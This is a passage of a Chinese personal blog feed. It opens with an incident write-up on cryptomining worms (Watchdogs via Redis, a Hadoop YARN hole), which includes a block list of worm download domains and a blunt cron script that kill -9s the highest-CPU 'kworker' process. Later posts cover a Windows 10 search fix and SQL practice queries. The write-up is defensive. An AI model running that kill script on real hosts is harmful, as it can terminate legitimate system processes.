title="来自阿里云的安全建议"></a>来自阿里云的安全建议</h3><p>数字加密货币的获取依赖计算资源的特质，催生了黑客进行大规模入侵的动机和土壤；类似Watchdogs蠕虫这样的数据库入侵事件，不是第一起，也不会是最后一起。阿里云作为“编写时即考虑安全性”的平台，提供良好的安全基础设施和丰富的安全产品，帮助用户抵御挖矿和入侵，同时提供以下安全建议：</p><ol><li>在入侵发生之前，加强数据库服务的密码，尽量不将数据库服务开放在互联网上，或根据实际情况进行访问控制（<code>ACL</code>）。这些措施能够帮助有效预防挖矿、勒索等攻击。平时还要注意备份资料，重视安全产品告警。</li><li><p>如果怀疑主机已被入侵挖矿，对于自身懂安全的用户，在攻击者手段较简单的情况下，可以通过自查<code>cpu</code>使用情况、运行进程、定时任务等方式，锁定入侵源头。</p></li><li><p>针对云上的环境，对于攻击者采用较多隐藏手段的攻击（如本次的<code>Watchdogs</code>蠕虫，使<code>ps</code>、<code>top</code>等系统命令失效），建议使用阿里云安全的下一代云防火墙产品，其阻断恶意外联、能够配置智能策略的功能，能够有效帮助防御入侵。哪怕攻击者在主机上的隐藏手段再高明，下载、挖矿、反弹shell这些操作，都需要进行恶意外联；云防火墙的拦截将彻底阻断攻击链。此外，用户还可以通过自定义策略，直接屏蔽<code>pastebin.com</code>、<code>thrysi.com</code>等广泛被挖矿蠕虫利用的网站，达到阻断入侵的目的。</p></li></ol><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v1iwxf04j22uk0n4tbu.jpg" alt></p><p>如图是云防火墙帮助用户拦截此次<code>Watchdogs</code>蠕虫下载的例子，图中共拦截23次对<code>pastebin.com</code>的请求；这些拦截导致主机未下载恶意脚本，从而就不会发起对<code>thrysi.com</code>的请求，故规则命中次数为0。</p><ol start="4"><li>对于有更高定制化要求的用户，可以考虑使用阿里云安全管家服务。购买服务后将有经验丰富的安全专家提供咨询服务，定制适合您的方案，帮助加固系统，预防入侵。入侵事件发生后，也可介入直接协助入侵后的清理、事件溯源等，适合有较高安全需求的用户，或未雇佣安全工程师，但希望保障系统安全的企业。</li></ol><h3 id="第一次事件分析"><a href="#第一次事件分析" class="headerlink" title="第一次事件分析"></a>第一次事件分析</h3><p>以上记录的是第二次的挖矿事件，两次挖矿事件有一些区别，第一次<code>hadoop</code>集群上遇到的挖矿事件，被利用的漏洞是yarn提交的漏洞，整个感染流程如下：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v1ogyzquj20mo09sab7.jpg" alt></p><p>第二次遇到的漏洞是<code>redis</code>上的漏洞，第二次的挖矿事件更为复杂，简单的Linux命令已经被病毒屏蔽，需要更为复杂的操作才能发现问题的根源。第一次挖矿事件和第二次挖矿事件有一点不同就是第一次的挖矿事件中，在删除<code>crontab</code>命令，删除挖矿脚本之后，仍然出现挖矿操作，通过分析、思考挖矿的逻辑，说明在<code>crontab</code>之前应该还有一层在控制进程，通过分析<code>status</code>之后，果然发现有好几个异常连接，分别是指向荷兰和美国，在<code>iptables</code>里面把这些<code>ip</code>屏蔽掉之后就解决了问题。</p><p>同时这边提供应急解决思路，如果急需使用集群的话，可以根据这些挖矿病毒的特点——<code>CPU</code>高占用，写一个定期删除<code>CPU</code>占用超过<code>95</code>进程的脚本，同样用<code>Crontab</code>定期执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/sh</span><br><span class="line"></span><br><span class="line">NAME=$1</span><br><span class="line">echo $NAME</span><br><span class="line"><span class="meta">#</span>ID=`ps -ef | grep "$NAME" | grep -v "$0" | grep -v "grep" | awk '&#123;print $2&#125;'`</span><br><span class="line">CPU=`ps -aux | grep kworker | sort -rn -k +3 | head -1 | awk &#123;'print $3'&#125; | awk -F. '&#123;print $1&#125;'`</span><br><span class="line">ID=`ps -aux | grep kworker  | sort -rn -k +3 | head -1 | awk &#123;'print $2'&#125;`</span><br><span class="line">echo $CPU</span><br><span class="line">echo $ID</span><br><span class="line">echo "---------------"</span><br><span class="line">sleep 1s</span><br><span class="line">if [ $CPU -ge 95 ]; then</span><br><span class="line">   echo "killed $ID"</span><br><span class="line">   kill -9 $ID</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>然后<code>crontab -e</code>执行定时任务每分钟执行该脚本</p><p><code>crontab -e</code></p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /etc/init.d/killprocess.sh</span><br></pre></td></tr></table></figure><p>### </p><p>币圈多少也涉及一点，之前<code>BTC</code>劫持软件劫持下来的<code>BTC</code>所在地址根本没动，确实这个钱没有办法提现，应该时刻都被监控着。所以这次接触的挖矿脚本涉及的都是带匿名属性的数字货币。区块链在17 18年刮起的一阵风暴不知道还有没有后续了。</p><p>最后附上阿里云2019年1月发布的云上挖矿分析报告（双击打开）。</p><p><a href="https://paper.seebug.org/806/" target="_blank" rel="noopener">阿里云上挖矿分析报告</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;京东云和公司集群分别遇到过一次挖矿脚本，经过分析，发现两次挖矿事件有所不同，在这篇文档记录下两次挖矿事件的异同、总结和反思。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Hadoop" scheme="http://yoursite.com/categories/Hadoop/"/>
    
      <category term="Security" scheme="http://yoursite.com/categories/Hadoop/Security/"/>
    
    
      <category term="病毒" scheme="http://yoursite.com/tags/%E7%97%85%E6%AF%92/"/>
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="脚本" scheme="http://yoursite.com/tags/%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>win10搜索栏失效</title>
    <link href="http://yoursite.com/2019/06/18/win10%E6%90%9C%E7%B4%A2%E6%A0%8F%E5%A4%B1%E6%95%88/"/>
    <id>http://yoursite.com/2019/06/18/win10搜索栏失效/</id>
    <published>2019-06-18T07:40:44.211Z</published>
    <updated>2019-05-09T18:01:34.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>打开电脑突然发现，win10菜单的快速搜索APP功能失效了</p></blockquote><a id="more"></a> <p>稍微研究了一下，很简单，两步解决<br>第一步</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start powershell</span><br></pre></td></tr></table></figure><p>第二步，在弹出的新窗口中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-AppXPackage -Name Microsoft.Windows.Cortana | Foreach &#123;Add-AppxPackage -DisableDevelopmentMode -Register "$($_.InstallLocation)\AppXManifest.xml"&#125;</span><br></pre></td></tr></table></figure><p>bingo！</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;打开电脑突然发现，win10菜单的快速搜索APP功能失效了&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Win" scheme="http://yoursite.com/categories/Win/"/>
    
      <category term="win10 bugs" scheme="http://yoursite.com/categories/Win/win10-bugs/"/>
    
    
      <category term="Win" scheme="http://yoursite.com/tags/Win/"/>
    
      <category term="Tips" scheme="http://yoursite.com/tags/Tips/"/>
    
  </entry>
  
  <entry>
    <title>SQL积累</title>
    <link href="http://yoursite.com/2019/06/18/SQL/"/>
    <id>http://yoursite.com/2019/06/18/SQL/</id>
    <published>2019-06-18T07:40:44.203Z</published>
    <updated>2019-06-12T08:50:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>SQL看似简单其实也包含了相当多的内容</p><p>慢慢积累吧，最近状态不咋好，一点点来</p><a id="more"></a> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查找最晚入职员工的所有信息</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`employees`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`birth_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`first_name`</span> <span class="built_in">varchar</span>(<span class="number">14</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`last_name`</span> <span class="built_in">varchar</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`gender`</span> <span class="built_in">char</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`hire_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">--有个答案是</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> employees</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> hire_date <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="comment">--但是这个答案有个问题，当一天由多个同事入职的时候会出现歧义</span></span><br><span class="line"><span class="comment">--所以用下面的方法是绝对正确的</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> employees <span class="keyword">where</span> hire_date = (<span class="keyword">select</span> <span class="keyword">max</span>(hire_date) <span class="keyword">from</span> employees)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查找入职员工时间排名倒数第三的员工所有信息</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`employees`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`birth_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`first_name`</span> <span class="built_in">varchar</span>(<span class="number">14</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`last_name`</span> <span class="built_in">varchar</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`gender`</span> <span class="built_in">char</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`hire_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--LIMIT m,n : 表示从第m+1条开始，取n条数据；</span></span><br><span class="line"><span class="comment">--LIMIT n ： 表示从第0条开始，取n条数据，是limit(0,n)的缩写。</span></span><br><span class="line"><span class="comment">--考察点是limit的用法</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> employees</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> hire_date <span class="keyword">desc</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--与此同时还有一种想法觉得入职日期，只要是同一天的也就不分前后，也就是说，题目转换为了倒数三天前入职的所有同事。</span></span><br><span class="line"><span class="keyword">select</span> * </span><br><span class="line"><span class="keyword">from</span> employees </span><br><span class="line"><span class="keyword">where</span> hire_date = </span><br><span class="line">    (<span class="keyword">select</span> <span class="keyword">distinct</span> hire_date </span><br><span class="line">     <span class="keyword">from</span> employees </span><br><span class="line">     <span class="keyword">order</span> <span class="keyword">by</span> hire_date <span class="keyword">DESC</span> </span><br><span class="line">     <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment">--同时考虑到distinct效率问题还可以改用group by</span></span><br><span class="line"><span class="comment">--经过测试，这种写法确实比上面的效率要高一点，同时应该要注意到这个应该和数据量也有关系</span></span><br><span class="line"><span class="keyword">select</span> * </span><br><span class="line"><span class="keyword">from</span> employees</span><br><span class="line"><span class="keyword">where</span> hire_date = </span><br><span class="line">(<span class="keyword">select</span> hire_date</span><br><span class="line">    <span class="keyword">from</span> employees</span><br><span class="line">    <span class="keyword">group</span> <span class="keyword">by</span> hire_date</span><br><span class="line">    <span class="keyword">order</span> <span class="keyword">by</span> hire_date <span class="keyword">desc</span></span><br><span class="line">    <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查找各个部门当前(to_date='9999-01-01')领导当前薪水详情以及其对应部门编号dept_no</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`dept_manager`</span> (</span><br><span class="line"><span class="string">`dept_no`</span> <span class="built_in">char</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`from_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`to_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>,<span class="string">`dept_no`</span>));</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`salaries`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`salary`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`from_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`to_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>,<span class="string">`from_date`</span>));</span><br><span class="line"><span class="comment">--要求输出格式：</span></span><br><span class="line"><span class="comment">--emp_nosalaryfrom_dateto_datedept_no</span></span><br><span class="line"><span class="comment">--答案一：先在两个表里用where过滤出现任的人选，然后用相等简单相等关联即可。</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    s.*, dm.dept_no</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">    salaries <span class="keyword">as</span> s,</span><br><span class="line">    dept_manager <span class="keyword">as</span> dm</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    s.to_date = <span class="string">'9999-01-01'</span></span><br><span class="line"><span class="keyword">and</span></span><br><span class="line">    dm.to_date = <span class="string">'9999-01-01'</span></span><br><span class="line"><span class="keyword">and</span></span><br><span class="line">    s.emp_no = dm.emp_no;</span><br><span class="line"><span class="comment">--答案二：</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    s.* , d.dept_no</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">    salaries <span class="keyword">as</span> s</span><br><span class="line"><span class="keyword">join</span></span><br><span class="line">    dept_manager <span class="keyword">as</span> d</span><br><span class="line"><span class="keyword">on</span></span><br><span class="line">    s.emp_no = d.emp_no</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    s.to_date = <span class="string">'9999-01-01'</span></span><br><span class="line"><span class="keyword">and</span></span><br><span class="line">    d.to_date = <span class="string">'9999-01-01'</span></span><br><span class="line"><span class="comment">--此题比较坑，限制了两个to_date，是因为薪水可能会变，人员也可能会变。</span></span><br><span class="line">然后两个表的前后位置不能动，否则和输出不符，姑且理解为必须小表<span class="keyword">join</span>大表吧。</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查找所有已经分配部门的员工的last_name和first_name</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`dept_emp`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`dept_no`</span> <span class="built_in">char</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`from_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`to_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>,<span class="string">`dept_no`</span>));</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`employees`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`birth_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`first_name`</span> <span class="built_in">varchar</span>(<span class="number">14</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`last_name`</span> <span class="built_in">varchar</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`gender`</span> <span class="built_in">char</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`hire_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>));</span><br><span class="line"><span class="comment">--我首先考虑的是没有使用join的情况</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    e.last_name, e.first_name, d.dept_no</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">    dept_emp <span class="keyword">as</span> d, employees <span class="keyword">as</span> e</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    d.emp_no = e.emp_no</span><br><span class="line"><span class="comment">--其实从效率方面考虑，使用join会不会好一点，好像使用自然连接不用on就可以</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    e.last_name, e.first_name, d.dept_no</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">    dept_emp <span class="keyword">as</span> d</span><br><span class="line"><span class="keyword">natural</span> <span class="keyword">join</span></span><br><span class="line">    employees <span class="keyword">as</span> e</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--下面这道还是类似的</span></span><br><span class="line"><span class="comment">--查找所有员工的last_name和first_name以及对应部门编号dept_no，也包括展示没有分配具体部门的员工</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`dept_emp`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`dept_no`</span> <span class="built_in">char</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`from_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`to_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>,<span class="string">`dept_no`</span>));</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`employees`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`birth_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`first_name`</span> <span class="built_in">varchar</span>(<span class="number">14</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`last_name`</span> <span class="built_in">varchar</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`gender`</span> <span class="built_in">char</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`hire_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    e.last_name, e.first_name, d.dept_no</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">    employees <span class="keyword">as</span> e</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span></span><br><span class="line">    dept_emp <span class="keyword">as</span> d</span><br><span class="line"><span class="keyword">on</span></span><br><span class="line">    e.emp_no = d.emp_no</span><br><span class="line"><span class="comment">--简单的left join</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查找所有员工入职时候的薪水情况，给出emp_no以及salary， 并按照emp_no进行逆序</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`employees`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`birth_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`first_name`</span> <span class="built_in">varchar</span>(<span class="number">14</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`last_name`</span> <span class="built_in">varchar</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`gender`</span> <span class="built_in">char</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`hire_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>));</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`salaries`</span> (</span><br><span class="line"><span class="string">`emp_no`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`salary`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`from_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="string">`to_date`</span> <span class="built_in">date</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`emp_no`</span>,<span class="string">`from_date`</span>));</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SQL看似简单其实也包含了相当多的内容&lt;/p&gt;
&lt;p&gt;慢慢积累吧，最近状态不咋好，一点点来&lt;/p&gt;
    
    </summary>
    
      <category term="SQL" scheme="http://yoursite.com/categories/SQL/"/>
    
    
      <category term="SQL" scheme="http://yoursite.com/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>Spark ML</title>
    <link href="http://yoursite.com/2019/06/18/SparkML/"/>
    <id>http://yoursite.com/2019/06/18/SparkML/</id>
    <published>2019-06-18T07:40:44.194Z</published>
    <updated>2019-05-23T08:06:42.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>SparkML也是个大坑，先在这里贴上pom文件</p></blockquote><a id="more"></a> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 